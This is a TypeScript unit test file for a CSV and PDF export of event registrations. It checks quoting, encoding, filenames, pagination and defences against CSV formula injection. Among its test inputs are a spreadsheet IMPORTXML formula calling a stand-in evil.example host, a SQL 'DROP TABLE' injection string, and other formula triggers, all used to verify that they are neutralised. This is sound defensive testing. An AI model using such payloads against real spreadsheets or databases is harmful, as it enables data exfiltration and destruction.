/*
 * Story: SPM-63 View Registration Information (Organiser and Coordinator), CSV and PDF writers.
 * ACs: AC4 (export as CSV or PDF).
 * Test cases: VIEW-REG-INFO-04-A (CSV body and filename), 04-C (empty CSV), 04-D (RFC 4180 and UTF-8),
 *             04-E (formula neutralisation, neutralise-then-quote), 04-B-PAGES (PDF continues on further pages).
 * The PDF content cases (04-B text, order and non-ASCII, 04-C empty message, 04-E literal payloads) need the real
 * report endpoint and are in registrations.report.e2e-spec.ts.
 *
 * Pure serializer tests: no database, no clock (the "generated" instant is part of the input). Oracles are
 * literals from the Confluence cases and the prompt's resolved specs (2.5); the CSV dialect is D9:
 * UTF-8 with BOM, RFC 4180 minimal quoting, CRLF after every record including the last.
 */
import { PDFParse } from 'pdf-parse';
import { describe, expect, it } from 'vitest';
import { neutralizeCsvCell } from './sanitization.js';
import { buildCsv, buildPdf, reportFilename, toCsvCell } from './export.service.js';
import { ALICE_TAN, T0, makeReport, makeRow, EVT_101_ID } from './report.fixtures.js';

const BOM = '﻿';
const HEADER = 'Name,Email,Contact Number,Registration Date,Status';
const csvText = (buffer: Buffer) => buffer.toString('utf8');

describe('SPM-63 AC4: the CSV file matches the report', () => {
  // VIEW-REG-INFO-04-A
  // Oracle (SPEC 04-A, D6/D7/D9): header, then Dev, Alice, Chloe in registration-date order; dates in SGT without a
  // zone suffix; BOM first; CRLF ends every record including the last.
  // Kills: M8 sorted descending/by id (here: rows reordered); Withdrawn row exported; LF endings; header text drift;
  //        UTC hour shown; a swapped column; BOM or trailing CRLF missing.
  it('VIEW-REG-INFO-04-A: the body is exactly the header and the three rows', () => {
    // Arrange: EVT-101 report with the three Confirmed registrations (REG-9007, REG-9001, REG-EXTRA-01).
    const report = makeReport();

    // Act
    const body = csvText(buildCsv(report));

    // Assert: literal body
    expect(body).toBe(
      `${BOM}${HEADER}\r\n` +
        'Dev Patel,dev.patel@example.com,87654321,27 Sep 2026 15:00,Confirmed\r\n' + // 07:00Z + 8h
        'Alice Tan,alice.tan@example.com,98765432,28 Sep 2026 10:30,Confirmed\r\n' + // 02:30Z + 8h
        'Chloe Ng,chloe.ng@example.com,91234567,29 Sep 2026 09:00,Confirmed\r\n', // 01:00Z + 8h
    );
  });

  // VIEW-REG-INFO-04-A
  // Oracle (D9): the file is UTF-8 and starts with the three BOM bytes EF BB BF.
  // Kills: BOM omitted (Excel mis-decodes non-ASCII); a Latin-1 or UTF-16 encoding.
  it('VIEW-REG-INFO-04-A: the first bytes are the UTF-8 byte order mark', () => {
    // Arrange / Act
    const bytes = buildCsv(makeReport());

    // Assert
    expect([...bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
  });

  // VIEW-REG-INFO-04-C
  // Oracle (SPEC 04-C, D9): an empty report is the header row and its CRLF, and nothing else.
  // Kills: M18 header dropped when there are no rows; a stray blank line.
  it('VIEW-REG-INFO-04-C: an empty report is the header row only', () => {
    // Arrange
    const report = makeReport({ registrations: [], totalConfirmed: 0, availableSpots: 50 });

    // Act
    const body = csvText(buildCsv(report));

    // Assert
    expect(body).toBe(`${BOM}${HEADER}\r\n`);
  });

  // VIEW-REG-INFO-04-E-ISO
  // Oracle (ISO-1): building the file must not modify the report that the screen and the PDF also use.
  // Kills: rows neutralised or sorted in place (aliasing).
  it('VIEW-REG-INFO-04-E-ISO: the report passed in is not mutated', () => {
    // Arrange
    const report = makeReport({ registrations: [makeRow({ fullName: '=1+1' })] });
    const before = JSON.parse(JSON.stringify(report));

    // Act
    buildCsv(report);

    // Assert
    expect(report).toEqual(before);
  });
});

describe('SPM-63 AC4: the export filename uses the event id and the SGT date of generation', () => {
  // VIEW-REG-INFO-04-A
  // Oracle (SPEC 04-A, F8 / Q10): "<event id>_registrations_<SGT date>.<ext>"; T0 is 29 Sep 2026 12:00 SGT.
  // Kills: the extension or separator changed; the event name used instead of the id.
  it.each([
    ['csv', `${EVT_101_ID}_registrations_2026-09-29.csv`],
    ['pdf', `${EVT_101_ID}_registrations_2026-09-29.pdf`],
  ] as const)('VIEW-REG-INFO-04-A: %s filename', (format, expected) => {
    // Arrange / Act
    const name = reportFilename(EVT_101_ID, T0, format);

    // Assert
    expect(name).toBe(expected);
  });

  // VIEW-REG-INFO-04-A-BND
  // Oracle (SPEC 2.5 added BND): 2026-09-30 00:30 SGT is still 29 Sep in UTC, so the file is dated 2026-09-30.
  // Kills: M9 filename date taken from UTC.
  it('VIEW-REG-INFO-04-A-BND: just after SGT midnight the filename carries the next date', () => {
    // Arrange / Act
    const name = reportFilename(EVT_101_ID, new Date('2026-09-30T00:30:00+08:00'), 'csv');

    // Assert
    expect(name).toBe(`${EVT_101_ID}_registrations_2026-09-30.csv`);
  });
});

describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
  // VIEW-REG-INFO-04-D
  // Oracle (SPEC 04-D, RFC 4180): a comma forces quotes.
  // Kills: M10 comma quoting removed (the name would split into two columns).
  it('VIEW-REG-INFO-04-D: "Smith, John" is wrapped in quotes', () => {
    // Arrange / Act
    const cell = toCsvCell('Smith, John');

    // Assert
    expect(cell).toBe('"Smith, John"');
  });

  // VIEW-REG-INFO-04-D
  // Oracle (SPEC 04-D): a plus sign is ordinary text; the cell stays unquoted and unchanged.
  // Kills: over-quoting; "+" treated as a formula trigger in the middle of a value.
  it('VIEW-REG-INFO-04-D: test+tag@example.com is left as it is', () => {
    // Arrange / Act
    const cell = toCsvCell('test+tag@example.com');

    // Assert
    expect(cell).toBe('test+tag@example.com');
  });

  // VIEW-REG-INFO-04-D
  // Oracle (SPEC 04-D + F9): RFC 4180 doubles the inner quote: O"Brien -> "O""Brien". The backslash form is rejected.
  // Kills: M11 backslash escaping (O\"Brien); quotes not escaped at all.
  it('VIEW-REG-INFO-04-D: O"Brien becomes "O""Brien"', () => {
    // Arrange / Act
    const cell = toCsvCell('O"Brien');

    // Assert
    expect(cell).toBe('"O""Brien"');
  });

  // VIEW-REG-INFO-04-D
  // Oracle (SPEC 04-D "no newlines split rows"): a name with an embedded newline is quoted with the newline kept, so
  // the file has exactly one CRLF per record (header + 2 rows = 3), not one per line of text.
  // Kills: a newline written unquoted (it would start a new record); the newline stripped.
  it('VIEW-REG-INFO-04-D: an embedded newline stays inside one quoted record', () => {
    // Arrange: two registrations, the first name has an embedded LF.
    const report = makeReport({ registrations: [makeRow({ fullName: 'Ann\nLee' }), ALICE_TAN] });

    // Act
    const body = csvText(buildCsv(report));

    // Assert: the quoted multi-line cell is intact, and records are counted by their CRLF terminators.
    expect(body).toContain('"Ann\nLee",dev.patel@example.com,87654321,27 Sep 2026 15:00,Confirmed\r\n');
    expect(body.split('\r\n')).toHaveLength(4); // header, 2 records, then the empty tail after the final CRLF
  });

  // VIEW-REG-INFO-04-D
  // Oracle (SPEC 04-D "No garbled text"; D9): non-ASCII names are the UTF-8 byte sequences.
  //   Zoë = 5A 6F C3 AB; 陈维志 = E9 99 88 E7 BB B4 E5 BF 97 (hand-encoded from the code points).
  // Kills: Latin-1 / ASCII encoding; names dropped or replaced with "?".
  it('VIEW-REG-INFO-04-D: "Zoë" and "陈维志" are written as UTF-8 bytes', () => {
    // Arrange
    const report = makeReport({ registrations: [makeRow({ fullName: 'Zoë' }), makeRow({ fullName: '陈维志' })] });

    // Act
    const bytes = buildCsv(report);

    // Assert
    expect(bytes.includes(Buffer.from([0x5a, 0x6f, 0xc3, 0xab]))).toBe(true);
    expect(bytes.includes(Buffer.from([0xe9, 0x99, 0x88, 0xe7, 0xbb, 0xb4, 0xe5, 0xbf, 0x97]))).toBe(true);
  });
});

describe('SPM-63 AC4: formula neutralisation happens at export time, then quoting', () => {
  // VIEW-REG-INFO-04-E-INT
  // Oracle (SPEC 04-E, ASSUMED A6 payload): neutralise first (prefix '), then the cell contains quotes, so wrap and
  // double them: "'=IMPORTXML(""http://evil.example/x"",""//a"")".
  // Kills: M12 neutralisation removed, or quote applied before the prefix (that order gives '"=IMPORTXML(...)").
  it('VIEW-REG-INFO-04-E-INT: the formula payload is neutralised and then quoted', () => {
    // Arrange
    const payload = '=IMPORTXML("http://evil.example/x","//a")';

    // Act
    const cell = toCsvCell(payload);

    // Assert
    expect(cell).toBe('"\'=IMPORTXML(""http://evil.example/x"",""//a"")"');
  });

  // VIEW-REG-INFO-04-E-INT
  // Oracle (derived, order proof 2): "=a,b" has a comma, so it is prefixed and then quoted: "'=a,b".
  // Quote-then-prefix would give '"=a,b" (a quote in front of the opening quote).
  // Kills: M12 variant, quote before prefix.
  it('VIEW-REG-INFO-04-E-INT: a comma payload is prefixed before it is quoted', () => {
    // Arrange / Act
    const cell = toCsvCell('=a,b');

    // Assert
    expect(cell).toBe('"\'=a,b"');
  });

  // VIEW-REG-INFO-04-E
  // Oracle (SPEC 04-E: four triggers are SPEC =, +, -, @; tab and carriage return per OWASP): each gets a leading '.
  // Kills: any trigger missing from the list.
  it.each([
    ['=', '=1+1', "'=1+1"],
    ['+', '+1', "'+1"],
    ['-', '-1', "'-1"],
    ['@', '@SUM(1)', "'@SUM(1)"],
    ['tab', '\tcmd', "'\tcmd"],
    ['carriage return', '\rcmd', "'\rcmd"],
  ])('VIEW-REG-INFO-04-E: a leading %s is neutralised', (_name, input, expected) => {
    // Arrange / Act
    const cleaned = neutralizeCsvCell(input);

    // Assert
    expect(cleaned).toBe(expected);
  });

  // VIEW-REG-INFO-04-E-BND
  // Oracle (derived): a trigger character anywhere except the first position is harmless and left alone, so real
  // emails and phone-like text are not altered.
  // Kills: neutralising on "contains" instead of "starts with".
  it.each(['a=b', 'a+b', '1-2', 'x@y', 'Alice Tan', ''])('VIEW-REG-INFO-04-E-BND: "%s" is not altered', (input) => {
    // Arrange / Act
    const cleaned = neutralizeCsvCell(input);

    // Assert
    expect(cleaned).toBe(input);
  });

  // VIEW-REG-INFO-04-E-INT
  // Oracle (derived): a carriage return makes the neutralised cell need quoting even though it has no comma or quote.
  // Kills: quoting decided from the original text instead of the neutralised text.
  it('VIEW-REG-INFO-04-E-INT: a leading carriage return is prefixed and then quoted', () => {
    // Arrange / Act
    const cell = toCsvCell('\rcmd');

    // Assert
    expect(cell).toBe('"\'\rcmd"');
  });

  // VIEW-REG-INFO-04-E
  // Oracle (SPEC 04-E, A7): the SQL payload has no formula trigger, no comma and no CRLF, so it appears literally.
  // Kills: SQL text altered or escaped by the writer.
  it('VIEW-REG-INFO-04-E: a SQL payload is written literally', () => {
    // Arrange
    const report = makeReport({ registrations: [makeRow({ fullName: "'; DROP TABLE registrations; --" })] });

    // Act
    const body = csvText(buildCsv(report));

    // Assert
    expect(body).toContain("\r\n'; DROP TABLE registrations; --,dev.patel@example.com,");
  });
});

describe('SPM-63 AC4: every cell of a row goes through the writer', () => {
  // VIEW-REG-INFO-04-E
  // Oracle (derived): the email and contact cells are also written through the same rule, so a formula in any
  // column is neutralised, not only in the name.
  // Kills: neutralisation applied to the name column only.
  it('VIEW-REG-INFO-04-E: formula text in email and contact columns is neutralised too', () => {
    // Arrange
    const report = makeReport({
      registrations: [makeRow({ email: '=cmd@evil.example', contactNumber: '+6591234567' })],
    });

    // Act
    const body = csvText(buildCsv(report));

    // Assert
    expect(body).toContain("Dev Patel,'=cmd@evil.example,'+6591234567,27 Sep 2026 15:00,Confirmed\r\n");
  });

  // VIEW-REG-INFO-04-A
  // Oracle (SPM-61 AC: contact number optional): a missing contact number is an empty cell, keeping five columns.
  // Kills: the cell omitted (four columns) or "undefined"/"null" written.
  it('VIEW-REG-INFO-04-A: an empty contact number keeps the column', () => {
    // Arrange
    const report = makeReport({ registrations: [makeRow({ contactNumber: '' })] });

    // Act
    const body = csvText(buildCsv(report));

    // Assert
    expect(body).toContain('Dev Patel,dev.patel@example.com,,27 Sep 2026 15:00,Confirmed\r\n');
  });
});

describe('SPM-63 AC4: a long attendee list continues on further PDF pages', () => {
  // VIEW-REG-INFO-04-B-PAGES
  // Oracle (SPEC 04-B "no truncated text, overflow"): 80 attendees do not fit on one A4 page. The PDF has at least two
  // pages, the first and the last attendee are both present, and the column headings are repeated on the new page
  // (so "Registration Date" appears at least twice).
  // Kills: rows dropped or drawn off the page after the first page break; no repeated heading on the continuation page.
  it('VIEW-REG-INFO-04-B-PAGES: 80 attendees run onto a second page with the headings repeated', async () => {
    // Arrange: names "Person 01" ... "Person 80", registered one minute apart.
    const rows = Array.from({ length: 80 }, (_, i) =>
      makeRow({
        registrationId: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`,
        fullName: `Person ${String(i + 1).padStart(2, '0')}`,
        email: `person${i + 1}@example.com`,
        registeredAt: new Date(Date.UTC(2026, 8, 28, 2, i)).toISOString(),
      }),
    );
    const report = makeReport({ registrations: rows, totalConfirmed: 80, availableSpots: 0 });
    report.event.capacity = 80;

    // Act
    const parser = new PDFParse({ data: new Uint8Array(await buildPdf(report)) });
    const result = await parser.getText();
    await parser.destroy();

    // Assert
    expect(result.total).toBeGreaterThanOrEqual(2);
    expect(result.text).toContain('Person 01');
    expect(result.text).toContain('Person 80');
    expect(result.text.split('Registration Date').length - 1).toBeGreaterThanOrEqual(2);
  });
});

// ASSUMPTION index
// A6: 04-E concrete payload =IMPORTXML("http://evil.example/x","//a")  -> 04-E-INT, 04-E
// A7: the SQL payload is placed in the Full Name column (D6 excludes Special Requirements) -> 04-E
// A8: a missing contact number is an empty cell                           -> 04-A (empty contact)
// A9: filename token is the event id (F8 / Q10)                           -> 04-A filename tests
